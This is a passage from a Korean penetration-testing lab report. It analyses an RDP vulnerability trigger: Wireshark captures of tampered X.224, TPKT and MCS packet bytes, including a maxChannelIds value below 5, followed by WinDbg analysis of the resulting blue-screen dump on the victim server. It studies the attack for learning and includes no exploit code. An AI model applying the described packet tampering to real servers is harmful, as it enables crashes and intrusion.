기법 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 기법 분석</h2>\n<h3 id=\"wireshark-동적-분석\" style=\"position:relative;\"><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\" aria-label=\"wireshark 동적 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wireshark 동적 분석</h3>\n<p><strong>1. 세션 수립 과정</strong></p>\n<p>TCP 3-way Handshake 과정을 통해 클라이언트와 서버 사이의 세션을\n수립한다. 클라이언트 측에서 SYN 패킷을 보낼 때 기존에 사용하던 임시\n포트를 재사용하였다는 것을 TCP Port numbers reused 메시지를 통해 확인\n가능하다. 서버로부터 SYN, ACK 패킷을 받을 때 이전의 세그먼트를 확인하지\n못하고 패킷 손실이 발생했지만 클라이언트에서는 해당 응답을 받고 세션이\n수립됐다.</p>\n<p>![](./image39.png</p>\n<p><strong>2. 페이로드 전송 과정</strong></p>\n<p>RDP 연결 요청 부분의 X.224, TPKT 헤더의 바이트 값이 수정되어 서버 측으로\n전송됨을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABbUlEQVQoz03PW4/aMBCG4fz/X1RVe9WLdnfBTgJVKTnYDjSxE0IIhEPZlrwV3hb1k0bjGY0eyUEkpojJK+F0ShTHyFAylYIwCgmlRErBLI6YLzLULKaYRahQUMxivk8lmXjFZSnWWSprCZYvArdIceGceu2wK4tdVTT1lmZ7oG57Nt3AIrfor3OKUFJEIatZTC5DjBRsjOZ4GjgcDgQfniQfnyJfn75kPIuCzxNDOFGIpEMst4ikR3wrybUiNwW5Npj1mlxrklzRtC2n04nj8UjQtBtWK8O2a7lczjxyGvg/RdmSZRlaKbI0RWvte5ok1M55bL/fE2RKUZUlVVWx2+04n89cLj/53e0Yx5HbbfSg+dGSpqlHPay1n5fLJXVdMwyDryDJMpxztG3L9Xr9i9wY+x7G0c/3qPU7mOf5A7z3JEmw1tJ1nTeC+5EtSxrn+PX25hFuN+h7j/0DK/f+ZaWUR40x/n3fNU3zAP8AnsoBvacl4bgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image40\"\n        title=\"image40\"\n        src=\"/static/4277c735251ea66859591fef929bd348/d8f62/image40.png\"\n        srcset=\"/static/4277c735251ea66859591fef929bd348/e9ff0/image40.png 180w,\n/static/4277c735251ea66859591fef929bd348/f21e7/image40.png 360w,\n/static/4277c735251ea66859591fef929bd348/d8f62/image40.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>부분</p>\n<p>Client MCS Attach User Request PDU 헤더의 바이트 값이 수정되어 서버\n측으로 전송됨을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAzElEQVQI1x3G0U6DMBQGYN7/fbwyuzAKFbIbM81sm3YFIhsUGODGKDs7v4nf1Re9PAk8bz7w+iYRJxri3XAsDESsOEvNI/nylOxqSj4b2qsDGa1ISUnOWjJak1aSTtUPTdNE3rcU9fkBZVWiaY7ougYhzKDHyhRm4DICYACE9b7CfCu4NIXLMpTbLWyawQgBryT68xm+bRHVSqHIC/hTja7xuF2vHJYF4ffCS9fzst45hJXn28x54VhJyVpKdtay0fr/x6ricRx5GAb+A2LN2u7pvvNWAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image41\"\n        title=\"image41\"\n        src=\"/static/3ad0292170c4c918dbb0993deb58a1b1/d8f62/image41.png\"\n        srcset=\"/static/3ad0292170c4c918dbb0993deb58a1b1/e9ff0/image41.png 180w,\n/static/3ad0292170c4c918dbb0993deb58a1b1/f21e7/image41.png 360w,\n/static/3ad0292170c4c918dbb0993deb58a1b1/d8f62/image41.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Request PDU 바이트 변조 부분</p>\n<p>T.125 ConnectMCSPDU 패킷의 maxChannelids 필드 부분이 5보다 작은 값으로\n설정되어 전송하게 되어 버그가 발생하는 부분과 동일하다. 전체적인 패킷\n바이트 변조를 서버 측으로 전송한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABn0lEQVQozz2N2W7iMABF8/+/VKAq3QQituMk2LEd70vihAAq1XSkqTSiD706um9Hp+Dvu/bhgazXx/WGPj62qxXfbsX2mWw27Wol397066us2zDk4AfvkrMxhjEPc/BjUVYYNk1Z4apt247BpsFH0tCu7dj9WX9UQQmG34EWVGsuexqj9SnFZAuMKwgOoDxUCPacGa2cNXMeT1NeppzzRLhxHLS7Fy9BsJVTYBpECCL5pkjTpToy1uuYl/Pt78fX9y+3r+/rn39cmmhx9JW3lTfIKZAHvkwieVzUND+9tPsnJLAlfKHdTLqZ0OkOmTo+W2u8rZ2C3qBf+ZTFEOrCHPZss2abdd7vrgieIbggeGvqz7b5bOobPVqjnamdhsHcy1aBcWBz5tHhYl/CssI1pYQLoQ1TWhjj0uDH0Y9jGLO1JtjaGxjsvew1zIOYRx4sKgCAFUI1xpSQXgjBuRQiep9iTDEOKVlrZN/JnmrFlOykIMGb8zmf5lSUJUAIEUIYY1LKvu+llM45/7MQgjaaMc4Yl1JxIRjnzrnL5bosy387uNHrnyMyQgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image42\"\n        title=\"image42\"\n        src=\"/static/e0afbea813524ce703ff9801e5943464/0a47e/image42.png\"\n        srcset=\"/static/e0afbea813524ce703ff9801e5943464/e9ff0/image42.png 180w,\n/static/e0afbea813524ce703ff9801e5943464/f21e7/image42.png 360w,\n/static/e0afbea813524ce703ff9801e5943464/0a47e/image42.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ConnectMCSPDU 패킷을 전송한후 5.4.2 장의 RDP 연결 과정을 수행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABK0lEQVQY01WQ607CQBSEef8XU2CvbbUX2XPOdrctqICh2xYxBlNAQpP5O5lvvpmOK6Gc1D55WRdv+6XAvNghBqJORVWUNAAtYY/YEfVN/btZn++ZSe2EckK6KG7yYr9gJsu3iB1iJ5TXUYXYWRosDUS99z/vm4eyUI5xYoJ0VGf57nlh0uwT4IAYmLRSO4BA1AMExM6702Q5Smqlvbphf3FBRbEj6ol6FVVxUl/LF5bg3PekzGW54LjkJHWVZtun+eo1/QBoDQQmrFR+xLb/2O60bs73zHRcy0dhHPN8FHb57HRUgzkgdgDBQOvK6bLSnstSyPIqbM7gJgyC1E7HNVFflkdrB7KD99PPUnkmLLuUR2FLSPMtwDjFZSm1L4q9gWBMu1odrD0+Yv8BRXqn4eF5mvgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image43\"\n        title=\"image43\"\n        src=\"/static/1fade8e821b53c8ee407cf76befb9577/d8f62/image43.png\"\n        srcset=\"/static/1fade8e821b53c8ee407cf76befb9577/e9ff0/image43.png 180w,\n/static/1fade8e821b53c8ee407cf76befb9577/f21e7/image43.png 360w,\n/static/1fade8e821b53c8ee407cf76befb9577/d8f62/image43.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"windbg-동적-분석\" style=\"position:relative;\"><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\" aria-label=\"windbg 동적 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windbg 동적 분석</h3>\n<p><strong>1. 서버측 BSOD 분석</strong></p>\n<p>피해자 서버에서 발생한 BSOD 메모리 덤프를 통해 어느 부분에서 예외가\n발생하였는지 확인한다. 그림 4‑4장에서 설치한 BlueScreenView를 통해 오류\n메시지와 예외 함수 주소 값을 확인한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACXUlEQVQoz4XP3UtTcRgH8J+6kGSiCE1Wl14VgrfZH1CX+ZZGF11UqOXwDcN0lS4ym91YiIGVXqWkmVTDo27qWTtnL2fL952XOY9nhjqpmN30xs75xnQXEkkPfHj4feF5eH6EoZcJNT4lezweuFlGpWdpsAwDn9cLxvUBDOMCwzDg/H6IAg+eXwHPByGKAiRJQGhVRCgkxkWRhygsU2Ssb8zinnHH1oIS5lif9pH1Yd7NYcHjxxI3v8fv8kKYD0IOithci0DmQ4hIa/gUkhFeEbAZjqjSYhDhRSFMbG+ccDgDYDlJm3T4MDkTwOQ0h/cUA4dzAaxPhIOew6xrCTaKgSewCmrKiwk7h2nnAmwTLBifCBvFarP0HAhHB7AdVQCoWnRrHdHtDUSjEcgyj2+7OwB+I/Z1G79+7iKyLiJRO1sKvuxs4Mf3GCKKBEDDhiJpsc9REJHm7nS22WLtt8bRVDOi3TSNoqF6GDVXBtFQPYIm0xjqq0bQeGMUpqtDaK57h9rKV6irHEbj9dcwXRtCc+1bterySzx/7FglAIjR2CUfM1hhND5Sc3IeIiElxQJCWpJak8zJt/mvrDWeyE+d7KbIubM9Gfn5T5S8vG4YDFbVkNuVWIysrAdIS7MgNfWg9n9mOt29OCF3cabwqYOcON6WnptrVbKzO6HXd6h6fQcyMzuQcfQ+dLr9gf/RpVn2Fhae7rUT3ZGWdELMyv7pZjXZD3H7MHtfLijosZNLZdb0ovO9SnHJM5SV9qulxQMoKRpAeVk/KspfoOLCAeXJ7C8XK/rjJUV9aKgftP8BVTzs4OodzX8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image44\"\n        title=\"image44\"\n        src=\"/static/8a5fcf682c083e508949317424bf0e4c/d8f62/image44.png\"\n        srcset=\"/static/8a5fcf682c083e508949317424bf0e4c/e9ff0/image44.png 180w,\n/static/8a5fcf682c083e508949317424bf0e4c/f21e7/image44.png 360w,\n/static/8a5fcf682c083e508949317424bf0e4c/d8f62/image44.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">  <span class=\"token operator\">**</span>덤프 파일명<span class=\"token operator\">**</span>   <span class=\"token number\">061020</span><span class=\"token operator\">-</span><span class=\"token number\">13343</span><span class=\"token operator\">-</span><span class=\"token number\">01.</span>dmp        <span class=\"token operator\">**</span>발생 날짜<span class=\"token operator\">**</span>   <span class=\"token number\">6</span><span class=\"token operator\">/</span><span class=\"token number\">10</span><span class=\"token operator\">/</span><span class=\"token number\">2020</span> <span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">37</span> PM\n  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>\n  <span class=\"token operator\">**</span>예외 문자열<span class=\"token operator\">**</span>   SYSTEM_SERVICE_EXCEPTION   <span class=\"token operator\">**</span>예외 코드<span class=\"token operator\">**</span>   <span class=\"token number\">0x0000003b</span>\n  <span class=\"token operator\">**</span>파라미터<span class=\"token operator\">**</span>      <span class=\"token number\">00000000</span><span class=\"token operator\">-</span>c0000005                          \n                    <span class=\"token operator\">**</span>fffff880<span class=\"token operator\">-</span>011c9722<span class=\"token operator\">**</span>                      \n                    fffff880<span class=\"token operator\">-</span>0cad81f0                          </code></pre></div>\n<p><strong>2. BSOD 메모리 덤프 파일 분석 환경</strong></p>\n<p>windbg를 통해 분석하기 위해 그림 4‑1장에서 구성한 대상 서버에서 발생한\n메모리 덤프를 분석하고 자하는 로컬 환경으로 가져온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABmklEQVQozz2R2Y7aMBRAQwl9mz5OFohjEm8x3h0gCYnoVExRCxL9/68ZxaCeJ18dH1uyo6E/ZFma5+sfb2+LxWK5XMaBbzPzuFqt4jhePsU8f4/j1TIQWbefpsn7VmvTNE1Zlh8fvy6XC8bYGHv5aa/XT0rZ3+vvP9crQqg/fx67rqq2AIBIKkkZc9ZppTnnjDEppRSy4VxKqZW0zmKEKSXj1Blj/P7o25YxVpZllGdrZxtrJZp3UBQQQjRNQwgmhHK+C2sipdxut3meAwA2m01RFFFV4xKANE3qunbOUUoxxnVdw4DWeidEVVVCCIIxhJCQ2ZaBSBxGgur390Qp9Xg8pnHs+945GyxsAy7gvQNFQRmzdrYQwujYD5v1Os0yqfT9fj+dTv9jWELv59JaG3I7x5Qao1/x+TzWVZ2mqVL6drsNw3DsOqP182bftt5760JsQ8yoNeYV951DiGRZJoR4PP4Nw9APQ+v9M94HnHNtOKUoCsaYc+4VdweRZeskSTjn4zgqrZSe/yxYuNvtni/PAyUACKNg5/gL+kVdEo+7fYkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image45\"\n        title=\"image45\"\n        src=\"/static/47770b923dc6d6375b473138999651c5/d8f62/image45.png\"\n        srcset=\"/static/47770b923dc6d6375b473138999651c5/e9ff0/image45.png 180w,\n/static/47770b923dc6d6375b473138999651c5/f21e7/image45.png 360w,\n/static/47770b923dc6d6375b473138999651c5/d8f62/image45.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. windbg 심볼 설정</strong></p>\n<p>메모리 덤프파일이 빌드 될 때 생성되는 디버깅 정보파일을 불러오기 위해\n해당 심볼을 설정한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.777777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAkElEQVQI143JQQ7CIBQEUBIXBmiwi1KaYMU0paL9YNpjmOr9bzMGjK5dvMxkhil1gFIVdDfiuj4RlgduGS24JwJFAlFESgkxxtI/6Gees7lg4+gx+QH9sML4Fzq/4Rg22NOEcDnDuR7WWjjnYIxB0zTQWhe5t21b9px1XYMJIcC5gBR7VHwH+SV42fP/Lykl3pevTthqhC52AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image46\"\n        title=\"image46\"\n        src=\"/static/782b49255a296da15c591e7685f3e0e6/0a47e/image46.png\"\n        srcset=\"/static/782b49255a296da15c591e7685f3e0e6/e9ff0/image46.png 180w,\n/static/782b49255a296da15c591e7685f3e0e6/f21e7/image46.png 360w,\n/static/782b49255a296da15c591e7685f3e0e6/0a47e/image46.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span>\\\\windbg<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">-</span>y srv\\<span class=\"token operator\">*</span>c<span class=\"token operator\">:</span>\\\\symbols\\<span class=\"token operator\">*</span>http<span class=\"token operator\">:</span><span class=\"token comment\">//msdl.microsoft.com/download/symbols</span>\n     <span class=\"token operator\">-</span>z D<span class=\"token operator\">:</span>\\\\STUDY\\\\PenTest_Study\\\\Project\\\\Day4_5\\\\report\\\\bluescreen_dmp\\\\<span class=\"token number\">061020</span><span class=\"token operator\">-</span><span class=\"token number\">13343</span><span class=\"token operator\">-</span><span class=\"token number\">01.</span>dmp</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>옵션<span class=\"token operator\">**</span>          <span class=\"token operator\">|</span> <span class=\"token operator\">**</span>내용<span class=\"token operator\">**</span>                                        <span class=\"token operator\">|</span>\n<span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span><span class=\"token operator\">-</span>y SymbolPath<span class=\"token operator\">**</span> <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   심볼 경로 지정 및 다중 경로는 세미콜론 구분 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>                                                 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   경로에 띄어쓰기가 존 재시 따옴표를 통해     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     그룹화                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span><span class=\"token operator\">-</span>z DumFile<span class=\"token operator\">**</span>    <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   메모리 덤프 파일 이름 지정                  <span class=\"token operator\">|</span>\n<span class=\"token 